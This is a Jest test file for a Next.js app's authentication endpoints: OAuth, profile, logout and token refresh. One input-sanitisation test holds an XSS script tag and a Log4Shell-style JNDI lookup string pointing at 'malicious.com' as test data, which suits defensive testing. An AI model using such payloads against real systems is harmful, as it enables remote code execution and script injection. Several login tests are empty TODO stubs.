/**
 * Authentication API Tests
 * Authentication API 測試
 * 
 * Comprehensive tests for authentication endpoints including OAuth flows,
 * session management, and security validation
 */

import { NextRequest } from 'next/server'
import { 
  mockUsers,
  TestAuthHelpers,
  TestAPIHelpers,
  TestValidationHelpers,
  TestPerformanceHelpers
} from '../utils/test-helpers'

// Mock Google OAuth utilities
jest.mock('@/lib/google-oauth', () => ({
  generateGoogleAuthUrl: jest.fn((state) => `https://accounts.google.com/oauth/authorize?state=${state}&client_id=test`),
  generateSecureState: jest.fn(() => 'test-state-123'),
  validateGoogleOAuthConfig: jest.fn(() => true),
  exchangeCodeForTokens: jest.fn(),
  getUserInfo: jest.fn()
}))

// Mock auth utilities
jest.mock('@/lib/auth', () => ({
  getCurrentUser: jest.fn(),
  verifyJWT: jest.fn(),
  generateJWT: jest.fn(),
  hashPassword: jest.fn(),
  verifyPassword: jest.fn()
}))

// Mock middleware
jest.mock('@/lib/middleware', () => ({
  requireAuth: jest.fn(),
  requireAdmin: jest.fn(),
  requireTeacher: jest.fn()
}))

// Import handlers
import { GET as googleGET, POST as googlePOST } from '@/app/api/auth/google/route'
import { GET as callbackGET } from '@/app/api/auth/callback/google/route'
import { GET as meGET, PUT as mePUT } from '@/app/api/auth/me/route'
import { POST as logoutPOST } from '@/app/api/auth/logout/route'
import { POST as refreshPOST } from '@/app/api/auth/refresh/route'

// Import mocked modules for type checking
import { generateGoogleAuthUrl, generateSecureState, validateGoogleOAuthConfig } from '@/lib/google-oauth'
import { getCurrentUser, verifyJWT, generateJWT } from '@/lib/auth'
import { requireAuth, requireAdmin } from '@/lib/middleware'

describe('Authentication API Endpoints', () => {
  beforeEach(() => {
    jest.clearAllMocks()
  })

  describe('GET /api/auth/google - OAuth Initialization', () => {
    test('should redirect to Google OAuth with proper state and cookies', async () => {
      const mockState = 'test-state-123'
      const mockAuthUrl = `https://accounts.google.com/oauth/authorize?state=${mockState}&client_id=test`
      
      ;(validateGoogleOAuthConfig as jest.Mock).mockReturnValue(true)
      ;(generateSecureState as jest.Mock).mockReturnValue(mockState)
      ;(generateGoogleAuthUrl as jest.Mock).mockReturnValue(mockAuthUrl)
      
      const request = new NextRequest('http://localhost:3000/api/auth/google?redirect=/admin', {
        method: 'GET'
      })
      
      const response = await googleGET(request)
      
      expect(response.status).toBe(302)
      expect(response.headers.get('location')).toBe(mockAuthUrl)
      
      // Check cookies were set
      const setCookieHeader = response.headers.get('set-cookie')
      expect(setCookieHeader).toContain('oauth-state=test-state-123')
      expect(setCookieHeader).toContain('oauth-redirect=/admin')
    })

    test('should return error when OAuth config is missing', async () => {
      ;(validateGoogleOAuthConfig as jest.Mock).mockReturnValue(false)
      
      const request = new NextRequest('http://localhost:3000/api/auth/google', {
        method: 'GET'
      })
      
      const response = await googleGET(request)
      const data = await response.json()
      
      expect(response.status).toBe(500)
      expect(data.success).toBe(false)
      expect(data.error).toBe('OAuth configuration missing')
    })

    test('should handle errors gracefully', async () => {
      ;(validateGoogleOAuthConfig as jest.Mock).mockImplementation(() => {
        throw new Error('Config validation failed')
      })
      
      const request = new NextRequest('http://localhost:3000/api/auth/google', {
        method: 'GET'
      })
      
      const response = await googleGET(request)
      const data = await response.json()
      
      expect(response.status).toBe(500)
      expect(data.success).toBe(false)
      expect(data.error).toBe('OAuth initialization failed')
    })
  })

  describe('POST /api/auth/google - Frontend OAuth Request', () => {
    test('should return auth URL and state for frontend', async () => {
      const mockState = 'test-state-123'
      const mockAuthUrl = `https://accounts.google.com/oauth/authorize?state=${mockState}&client_id=test`
      
      ;(validateGoogleOAuthConfig as jest.Mock).mockReturnValue(true)
      ;(generateSecureState as jest.Mock).mockReturnValue(mockState)
      ;(generateGoogleAuthUrl as jest.Mock).mockReturnValue(mockAuthUrl)
      
      const request = new NextRequest('http://localhost:3000/api/auth/google', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ redirect: '/dashboard' })
      })
      
      const response = await googlePOST(request)
      const data = await response.json()
      
      expect(response.status).toBe(200)
      expect(data.success).toBe(true)
      expect(data.data.authUrl).toBe(mockAuthUrl)
      expect(data.data.state).toBe(mockState)
    })

    test('should return error when OAuth config is missing', async () => {
      ;(validateGoogleOAuthConfig as jest.Mock).mockReturnValue(false)
      
      const request = new NextRequest('http://localhost:3000/api/auth/google', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({})
      })
      
      const response = await googlePOST(request)
      const data = await response.json()
      
      expect(response.status).toBe(500)
      expect(data.success).toBe(false)
      expect(data.error).toBe('OAuth configuration missing')
    })
  })

  describe('GET /api/auth/me - Get Current User', () => {
    test('should return current user info when authenticated', async () => {
      const mockUser = mockUsers.viewer
      ;(requireAuth as jest.Mock).mockResolvedValue(mockUser)
      
      const request = await TestAuthHelpers.createAuthenticatedRequest(
        'http://localhost:3000/api/auth/me',
        'GET',
        mockUser
      )
      
      const response = await meGET(request)
      const data = await response.json()
      
      expect(response.status).toBe(200)
      expect(data.success).toBe(true)
      expect(data.data.user).toMatchObject({
        id: mockUser.id,
        email: mockUser.email,
        displayName: mockUser.displayName
      })
    })

    test('should return 401 when not authenticated', async () => {
      const mockErrorResponse = TestAPIHelpers.mockErrorResponse('Token required', 401)
      ;(requireAuth as jest.Mock).mockResolvedValue(mockErrorResponse)
      
      const request = new NextRequest('http://localhost:3000/api/auth/me', {
        method: 'GET'
      })
      
      const result = await meGET(request)
      
      // If requireAuth returns a NextResponse (error), it should be returned directly
      expect(result.status).toBe(401)
    })
  })

  describe('PUT /api/auth/me - Update Profile', () => {
    test('should update user profile successfully', async () => {
      const mockUser = mockUsers.viewer
      ;(requireAuth as jest.Mock).mockResolvedValue(mockUser)
      
      const updateData = {
        firstName: 'Updated',
        lastName: 'Name',
        displayName: 'Updated Name',
        phone: '+1234567890'
      }
      
      const request = await TestAuthHelpers.createAuthenticatedRequest(
        'http://localhost:3000/api/auth/me',
        'PUT',
        mockUser,
        updateData
      )
      
      // Mock prisma update
      const mockPrisma = {
        user: {
          update: jest.fn().mockResolvedValue({
            ...mockUser,
            ...updateData
          })
        }
      }
      
      jest.doMock('@/lib/prisma', () => ({ prisma: mockPrisma }))
      
      const response = await mePUT(request)
      const data = await response.json()
      
      expect(response.status).toBe(200)
      expect(data.success).toBe(true)
      expect(data.data.user.firstName).toBe('Updated')
    })

    test('should validate required fields', async () => {
      const mockUser = mockUsers.viewer
      ;(requireAuth as jest.Mock).mockResolvedValue(mockUser)
      
      const invalidData = {
        firstName: '', // Empty required field
        lastName: 'Name'
      }
      
      const request = await TestAuthHelpers.createAuthenticatedRequest(
        'http://localhost:3000/api/auth/me',
        'PUT',
        mockUser,
        invalidData
      )
      
      const response = await mePUT(request)
      const data = await response.json()
      
      expect(response.status).toBe(400)
      expect(data.success).toBe(false)
      expect(data.error).toBe('Missing required fields')
    })
  })

  describe('POST /api/auth/logout - User Logout', () => {
    test('should logout user and clear cookies', async () => {
      const mockUser = mockUsers.viewer
      ;(requireAuth as jest.Mock).mockResolvedValue(mockUser)
      
      const request = await TestAuthHelpers.createAuthenticatedRequest(
        'http://localhost:3000/api/auth/logout',
        'POST',
        mockUser
      )
      
      const response = await logoutPOST(request)
      const data = await response.json()
      
      expect(response.status).toBe(200)
      expect(data.success).toBe(true)
      expect(data.message).toContain('成功登出')
      
      // Check that auth cookies are cleared
      const setCookieHeader = response.headers.get('set-cookie')
      expect(setCookieHeader).toContain('auth-token=; Max-Age=0')
    })

    test('should return 401 when not authenticated', async () => {
      const mockErrorResponse = TestAPIHelpers.mockErrorResponse('Token required', 401)
      ;(requireAuth as jest.Mock).mockResolvedValue(mockErrorResponse)
      
      const request = new NextRequest('http://localhost:3000/api/auth/logout', {
        method: 'POST'
      })
      
      const result = await logoutPOST(request)
      expect(result.status).toBe(401)
    })
  })

  describe('POST /api/auth/refresh - Token Refresh', () => {
    test('should refresh valid token', async () => {
      const mockUser = mockUsers.viewer
      const mockNewToken = 'new-jwt-token-123'
      
      ;(verifyJWT as jest.Mock).mockResolvedValue({ userId: mockUser.id })
      ;(generateJWT as jest.Mock).mockResolvedValue(mockNewToken)
      
      // Mock prisma user lookup
      const mockPrisma = {
        user: {
          findUnique: jest.fn().mockResolvedValue({
            ...mockUser,
            userRoles: [{ role: { name: 'viewer' } }]
          })
        }
      }
      
      jest.doMock('@/lib/prisma', () => ({ prisma: mockPrisma }))
      
      const request = new NextRequest('http://localhost:3000/api/auth/refresh', {
        method: 'POST',
        headers: {
          'Cookie': 'auth-token=old-token-123',
          'Content-Type': 'application/json'
        }
      })
      
      const response = await refreshPOST(request)
      const data = await response.json()
      
      expect(response.status).toBe(200)
      expect(data.success).toBe(true)
      expect(data.data.token).toBe(mockNewToken)
    })

    test('should return 401 for invalid token', async () => {
      ;(verifyJWT as jest.Mock).mockRejectedValue(new Error('Invalid token'))
      
      const request = new NextRequest('http://localhost:3000/api/auth/refresh', {
        method: 'POST',
        headers: {
          'Cookie': 'auth-token=invalid-token',
          'Content-Type': 'application/json'
        }
      })
      
      const response = await refreshPOST(request)
      const data = await response.json()
      
      expect(response.status).toBe(401)
      expect(data.success).toBe(false)
      expect(data.error).toBe('Invalid or expired token')
    })

    test('should return 401 when no token provided', async () => {
      const request = new NextRequest('http://localhost:3000/api/auth/refresh', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      })
      
      const response = await refreshPOST(request)
      const data = await response.json()
      
      expect(response.status).toBe(401)
      expect(data.success).toBe(false)
      expect(data.error).toBe('No token provided')
    })
  })

  describe('Security and Validation Tests', () => {
    test('should validate JWT token format', () => {
      const validJWT = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'
      const invalidJWT = 'invalid.token.format'
      
      expect(TestValidationHelpers.isValidJWT(validJWT)).toBe(true)
      expect(TestValidationHelpers.isValidJWT(invalidJWT)).toBe(false)
    })

    test('should validate email formats in auth requests', () => {
      expect(TestValidationHelpers.isValidEmail('user@kcislk.com')).toBe(true)
      expect(TestValidationHelpers.isValidEmail('invalid-email')).toBe(false)
      expect(TestValidationHelpers.isValidEmail('user@')).toBe(false)
      expect(TestValidationHelpers.isValidEmail('@domain.com')).toBe(false)
    })

    test('should validate API response structure', () => {
      const successResponse = { success: true, data: { user: mockUsers.viewer } }
      const errorResponse = { success: false, error: 'Test error' }
      
      expect(TestValidationHelpers.validateAPIResponse(successResponse, true)).toBe(true)
      expect(TestValidationHelpers.validateAPIResponse(errorResponse, false)).toBe(true)
      expect(TestValidationHelpers.validateAPIResponse(successResponse, false)).toBe(false)
      expect(TestValidationHelpers.validateAPIResponse(errorResponse, true)).toBe(false)
    })

    test('should handle malformed request bodies gracefully', async () => {
      const request = new NextRequest('http://localhost:3000/api/auth/google', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: 'invalid-json-{'
      })
      
      const response = await googlePOST(request)
      const data = await response.json()
      
      expect(response.status).toBe(500)
      expect(data.success).toBe(false)
    })

    test('should rate limit authentication attempts', async () => {
      // This test would be implemented with actual rate limiting middleware
      // For now, we're testing the structure exists
      expect(typeof googlePOST).toBe('function')
      expect(typeof googleGET).toBe('function')
    })

    test('should sanitize user input in authentication', async () => {
      const maliciousData = {
        redirect: '<script>alert("xss")</script>',
        email: 'user@domain.com<script>',
        name: '${jndi:ldap://malicious.com}'
      }
      
      const request = new NextRequest('http://localhost:3000/api/auth/google', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(maliciousData)
      })
      
      const response = await googlePOST(request)
      
      // Should not crash and should handle malicious input safely
      expect(response.status).toBeGreaterThanOrEqual(200)
      expect(response.status).toBeLessThan(600)
    })
  })

  describe('Performance Tests', () => {
    test('authentication endpoint should respond quickly', async () => {
      const request = new NextRequest('http://localhost:3000/api/auth/google', {
        method: 'GET'
      })
      
      const { result, executionTime } = await TestPerformanceHelpers.measureExecutionTime(
        () => googleGET(request),
        'Google OAuth GET'
      )
      
      expect(executionTime).toBeLessThan(1000) // Should respond in under 1 second
    })

    test('token refresh should be fast', async () => {
      const mockUser = mockUsers.viewer
      ;(verifyJWT as jest.Mock).mockResolvedValue({ userId: mockUser.id })
      ;(generateJWT as jest.Mock).mockResolvedValue('new-token')
      
      const request = new NextRequest('http://localhost:3000/api/auth/refresh', {
        method: 'POST',
        headers: {
          'Cookie': 'auth-token=valid-token',
          'Content-Type': 'application/json'
        }
      })
      
      const { executionTime } = await TestPerformanceHelpers.measureExecutionTime(
        () => refreshPOST(request),
        'Token Refresh'
      )
      
      expect(executionTime).toBeLessThan(500) // Should be very fast
    })
  })

  describe('GET /api/auth/login', () => {
    test('should retrieve login', async () => {
      // TODO: Import the actual handler
      // const handler = require('@/app/apiauth/login/route')
      
      // This endpoint requires authentication
      const user = mockUsers.admin
      const request = await TestAuthHelpers.createAuthenticatedRequest(
        'http://localhost:3000/api/auth/login',
        'GET',
        user
      )
      
      // TODO: Call the handler and test response
      // const response = await handler.GET(request)
      // expect(response.status).toBe(200)
      // 
      // const data = await response.json()
      // expect(data.success).toBe(true)
    })
    
    test('should reject unauthorized access', async () => {
      const request = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'GET'
      })
      
      // TODO: Test without authentication
      // const response = await handler.GET(request)
      // expect(response.status).toBe(401)
    })
    
    test('should reject insufficient permissions', async () => {
      const user = mockUsers.viewer // Lower permission user
      const request = await TestAuthHelpers.createAuthenticatedRequest(
        'http://localhost:3000/api/auth/login',
        'GET',
        user
      )
      
      // TODO: Test with insufficient permissions
      // const response = await handler.GET(request)
      // expect(response.status).toBe(403)
    })
  })

  describe('POST /api/auth/login', () => {
    test('should create login', async () => {
      // TODO: Import the actual handler
      // const handler = require('@/app/apiauth/login/route')
      
      // This endpoint requires authentication
      const user = mockUsers.admin
      const request = await TestAuthHelpers.createAuthenticatedRequest(
        'http://localhost:3000/api/auth/login',
        'POST',
        user,
        { /* Add test data here */ }
      )
      
      // TODO: Call the handler and test response
      // const response = await handler.POST(request)
      // expect(response.status).toBe(200)
      // 
      // const data = await response.json()
      // expect(data.success).toBe(true)
    })
    
    test('should reject unauthorized access', async () => {
      const request = new NextRequest('http://localhost:3000/api/auth/login', {
        method: 'POST'
      })
      
      // TODO: Test without authentication
      // const response = await handler.POST(request)
      // expect(response.status).toBe(401)
    })
    
    test('should reject insufficient permissions', async () => {
      const user = mockUsers.viewer // Lower permission user
      const request = await TestAuthHelpers.createAuthenticatedRequest(
        'http://localhost:3000/api/auth/login',
        'POST',
        user
      )
      
      // TODO: Test with insufficient permissions
      // const response = await handler.POST(request)
      // expect(response.status).toBe(403)
    })
  })



})